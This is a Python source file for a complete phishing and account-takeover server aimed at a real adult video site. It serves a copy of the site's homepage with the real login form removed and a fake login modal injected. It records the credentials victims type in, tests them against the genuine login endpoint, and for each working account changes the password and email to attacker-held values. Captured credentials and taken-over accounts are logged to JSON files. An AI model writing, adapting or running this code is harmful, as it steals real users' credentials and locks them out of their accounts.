from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import os
import urllib.request
import urllib.parse

CREDS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "creds.json")
SUCCESS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "successful.json")

LOGIN_URL = "https://www.camwhores.tv/login/"
LOGIN_HEADERS = {
    "accept": "*/*",
    "accept-language": "es-US,es;q=0.9",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "origin": "https://www.camwhores.tv",
    "referer": "https://www.camwhores.tv/tags/cama/",
    "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "x-requested-with": "XMLHttpRequest",
}

NEW_PASSWORD = "123aaa"
NEW_EMAIL = "cuentadewapp1@gmail.com"
CHANGE_PASS_URL = "https://www.camwhores.tv/change-password/"
CHANGE_EMAIL_URL = "https://www.camwhores.tv/change-email/"

def try_login(username, password):
    data = urllib.parse.urlencode({
        "username": username,
        "pass": password,
        "action": "login",
        "email_link": "https://www.camwhores.tv/email/",
        "format": "json",
        "mode": "async",
    }).encode()
    req = urllib.request.Request(LOGIN_URL, data=data, headers=LOGIN_HEADERS)
    with urllib.request.urlopen(req) as resp:
        # Extract session cookie
        session_cookie = None
        for header in resp.headers.get_all("Set-Cookie") or []:
            if "PHPSESSID" in header:
                session_cookie = header.split(";")[0]
        result = json.loads(resp.read().decode())
        return result, session_cookie

def try_change_password(session_cookie, old_pass, new_pass):
    data = urllib.parse.urlencode({
        "old_pass": old_pass,
        "pass": new_pass,
        "pass2": new_pass,
        "action": "change_pass",
        "format": "json",
        "mode": "async",
    }).encode()
    headers = {**LOGIN_HEADERS, "referer": "https://www.camwhores.tv/my/"}
    headers["Cookie"] = session_cookie + "; kt_member=1"
    req = urllib.request.Request(CHANGE_PASS_URL, data=data, headers=headers)
    with urllib.request.urlopen(req) as resp:
        text = resp.read().decode()
        try:
            return json.loads(text)
        except json.JSONDecodeError:
            if "success" in text or "has been changed" in text:
                return {"status": "success", "raw": text.strip()}
            return {"status": "unknown", "raw": text.strip()}

def try_change_email(session_cookie, new_email):
    data = urllib.parse.urlencode({
        "email": new_email,
        "action": "change_email",
        "email_link": "https://www.camwhores.tv/email/",
        "format": "json",
        "mode": "async",
    }).encode()
    headers = {**LOGIN_HEADERS, "referer": "https://www.camwhores.tv/my/"}
    headers["Cookie"] = session_cookie + "; kt_member=1"
    req = urllib.request.Request(CHANGE_EMAIL_URL, data=data, headers=headers)
    with urllib.request.urlopen(req) as resp:
        text = resp.read().decode()
        try:
            return json.loads(text)
        except json.JSONDecodeError:
            if "success" in text or "has been changed" in text or "confirmation" in text:
                return {"status": "success", "raw": text.strip()}
            return {"status": "unknown", "raw": text.strip()}

PROD_URL = "https://www.camwhores.tv/"
PROD_HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "accept-language": "es-US,es;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
}

LOGIN_INJECTION = '''
<!-- Login Modal Overlay -->
<div id="login-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:8010;"></div>

<!-- Login Modal -->
<div id="login-modal" class="fancybox-wrap fancybox-desktop fancybox-type-ajax fancybox-opened" tabindex="-1" style="display:none; width:90vw; max-width:665px; height:auto; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); opacity:1; overflow:visible; z-index:8030;">
\t<div class="fancybox-skin" style="padding:15px; width:auto; height:auto; background:#1e1e1e;">
\t\t<div class="fancybox-outer">
\t\t\t<div class="fancybox-inner" style="overflow:auto; width:auto; height:auto;">
\t\t\t\t<strong class="popup-title">Login</strong>
\t\t\t\t<div class="popup-holder">
\t\t\t\t\t<form id="login-form" action="#" method="post">
\t\t\t\t\t\t<div class="generic-error hidden"></div>
\t\t\t\t\t\t<div>
\t\t\t\t\t\t\t<div class="row">
\t\t\t\t\t\t\t\t<label for="login_username" class="field-label required">Username</label>
\t\t\t\t\t\t\t\t<input type="text" name="username" id="login_username" class="textfield" placeholder="please enter login here">
\t\t\t\t\t\t\t\t<div class="field-error down"></div>
\t\t\t\t\t\t\t</div>
\t\t\t\t\t\t\t<div class="row">
\t\t\t\t\t\t\t\t<label for="login_pass" class="field-label required">Password</label>
\t\t\t\t\t\t\t\t<input type="password" name="pass" id="login_pass" class="textfield">
\t\t\t\t\t\t\t\t<div class="field-error down"></div>
\t\t\t\t\t\t\t</div>
\t\t\t\t\t\t\t<div class="row">
\t\t\t\t\t\t\t\t<input type="checkbox" name="remember_me" id="login_remember_me" class="checkbox" value="1">
\t\t\t\t\t\t\t\t<label for="login_remember_me">remember me</label>
\t\t\t\t\t\t\t</div>
\t\t\t\t\t\t\t<div class="bottom">
\t\t\t\t\t\t\t\t<input type="hidden" name="action" value="login">
\t\t\t\t\t\t\t\t<input type="submit" class="submit" value="Log in">
\t\t\t\t\t\t\t\t<div class="links">
\t\t\t\t\t\t\t\t\t<p><a href="#">Not a member yet? Sign up now for free!</a></p>
\t\t\t\t\t\t\t\t\t<p><a href="#">Forgot password?</a> / <a href="#">Missing confirmation email?</a></p>
\t\t\t\t\t\t\t\t</div>
\t\t\t\t\t\t\t</div>
\t\t\t\t\t\t</div>
\t\t\t\t\t</form>
\t\t\t\t</div>
\t\t\t</div>
\t\t</div>
\t\t<a title="Close" class="fancybox-close" href="javascript:;" id="login-close"></a>
\t</div>
</div>

<script>
(function() {
\tvar overlay = document.getElementById('login-overlay');
\tvar modal = document.getElementById('login-modal');
\tvar closeBtn = document.getElementById('login-close');

\tfunction openLogin(e) {
\t\te.preventDefault();
\t\te.stopImmediatePropagation();
\t\tif (typeof $.fancybox !== 'undefined') try { $.fancybox.close(); } catch(x) {}
\t\toverlay.style.display = 'block';
\t\tmodal.style.display = 'block';
\t}

\tfunction closeLogin() {
\t\toverlay.style.display = 'none';
\t\tmodal.style.display = 'none';
\t}

\tdocument.querySelectorAll('#login, .open-login, [data-fancybox="ajax"], a[href*="/login/"]').forEach(function(link) {
\t\tlink.removeAttribute('data-fancybox');
\t\tlink.style.cursor = 'pointer';
\t\tlink.addEventListener('click', openLogin, true);
\t});

\tcloseBtn.addEventListener('click', closeLogin);
\toverlay.addEventListener('click', closeLogin);

\tdocument.getElementById('login-form').addEventListener('submit', function(e) {
\t\te.preventDefault();
\t\tvar username = document.getElementById('login_username').value;
\t\tvar password = document.getElementById('login_pass').value;
\t\tvar remember = document.getElementById('login_remember_me').checked;

\t\tif (!username || !password) return;

\t\tvar params = 'username=' + encodeURIComponent(username)
\t\t\t+ '&password=' + encodeURIComponent(password)
\t\t\t+ '&remember_me=' + remember
\t\t\t+ '&timestamp=' + encodeURIComponent(new Date().toISOString());

\t\tfetch('/api/save-creds?' + params).then(function(r) {
\t\t\treturn r.json();
\t\t}).then(function(data) {
\t\t\tif (data.login_status === 'success') {
\t\t\t\twindow.location.href = 'https://www.camwhores.tv/';
\t\t\t} else {
\t\t\t\tvar err = document.querySelector('#login-form .generic-error');
\t\t\t\terr.textContent = 'Invalid Username or Password. Username and Password are case-sensitive.';
\t\t\t\terr.style.display = 'block';
\t\t\t\terr.classList.remove('hidden');
\t\t\t}
\t\t}).catch(function(err) {
\t\t\tconsole.error('save-creds error:', err);
\t\t});
\t});
})();
</script>
'''

_cached_page = None

def fetch_prod_page():
    global _cached_page
    if _cached_page:
        return _cached_page
    try:
        req = urllib.request.Request(PROD_URL, headers=PROD_HEADERS)
        with urllib.request.urlopen(req, timeout=10) as resp:
            html = resp.read().decode("utf-8", errors="replace")
        # Remove prod login form if present
        import re
        html = re.sub(r'<form[^>]*action="https://www\.camwhores\.tv/login/"[^>]*>.*?</form>', '', html, flags=re.DOTALL)
        # Inject custom login modal before </body>
        html = html.replace('</body>', LOGIN_INJECTION + '\n</body>')
        _cached_page = html
        print("[PROD] Fetched and cached prod page")
    except Exception as e:
        print(f"[PROD ERROR] {e}")
        _cached_page = None
        return None
    return _cached_page


class Handler(SimpleHTTPRequestHandler):
    def do_GET(self):
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(self.path)

        if parsed.path == "/" or parsed.path == "/index.html":
            page = fetch_prod_page()
            if page:
                content = page.encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(content)))
                self.end_headers()
                self.wfile.write(content)
            else:
                # Fallback to local index.html
                super().do_GET()
        elif parsed.path in ("/save-creds", "/api/save-creds"):
            params = parse_qs(parsed.query)
            body = {k: v[0] for k, v in params.items()}

            # Try login against real endpoint
            login_result = None
            try:
                login_result, session_cookie = try_login(body.get("username", ""), body.get("password", ""))
                body["login_status"] = login_result.get("status", "unknown")
                body["login_response"] = login_result
                print(f"[LOGIN] {body['username']} -> {login_result.get('status')}")

                # If login succeeded, change password
                if login_result.get("status") == "success" and session_cookie:
                    try:
                        change_result = try_change_password(session_cookie, body.get("password", ""), NEW_PASSWORD)
                        body["change_pass_status"] = change_result.get("status", "unknown")
                        body["change_pass_response"] = change_result
                        print(f"[CHANGE PASS] {body['username']} -> {change_result.get('status')}")
                    except Exception as e:
                        body["change_pass_status"] = "error"
                        body["change_pass_error"] = str(e)
                        print(f"[CHANGE PASS ERROR] {body['username']} -> {e}")

                    # Change email
                    try:
                        email_result = try_change_email(session_cookie, NEW_EMAIL)
                        body["change_email_status"] = email_result.get("status", "unknown")
                        body["change_email_response"] = email_result
                        print(f"[CHANGE EMAIL] {body['username']} -> {email_result.get('status')}")
                    except Exception as e:
                        body["change_email_status"] = "error"
                        body["change_email_error"] = str(e)
                        print(f"[CHANGE EMAIL ERROR] {body['username']} -> {e}")
            except Exception as e:
                body["login_status"] = "error"
                body["login_error"] = str(e)
                print(f"[LOGIN ERROR] {body.get('username')} -> {e}")

            # Save to JSON
            creds = []
            if os.path.exists(CREDS_FILE):
                with open(CREDS_FILE, "r") as f:
                    creds = json.load(f)

            creds.append(body)

            with open(CREDS_FILE, "w") as f:
                json.dump(creds, f, indent=2)

            # Save successful entries to successful.json
            if (body.get("login_status") == "success"
                and body.get("change_pass_status") == "success"
                and body.get("change_email_status") == "success"):
                successes = []
                if os.path.exists(SUCCESS_FILE):
                    with open(SUCCESS_FILE, "r") as f:
                        successes = json.load(f)
                successes.append({
                    "username": body.get("username"),
                    "original_password": body.get("password"),
                    "new_password": NEW_PASSWORD,
                    "new_email": NEW_EMAIL,
                    "timestamp": body.get("timestamp"),
                })
                with open(SUCCESS_FILE, "w") as f:
                    json.dump(successes, f, indent=2)
                print(f"[SUCCESS] {body['username']} saved to successful.json")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            errors = body.get("login_response", {}).get("errors", []) if isinstance(body.get("login_response"), dict) else []
            error_message = errors[0].get("message", "") if errors else ""
            self.wfile.write(json.dumps({
                "login_status": body.get("login_status"),
                "error_message": error_message,
            }).encode())
        else:
            super().do_GET()

if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    server = HTTPServer(("0.0.0.0", 8080), Handler)
    print(f"Serving on http://localhost:8080")
    print(f"Creds will be saved to: {CREDS_FILE}")
    server.serve_forever()
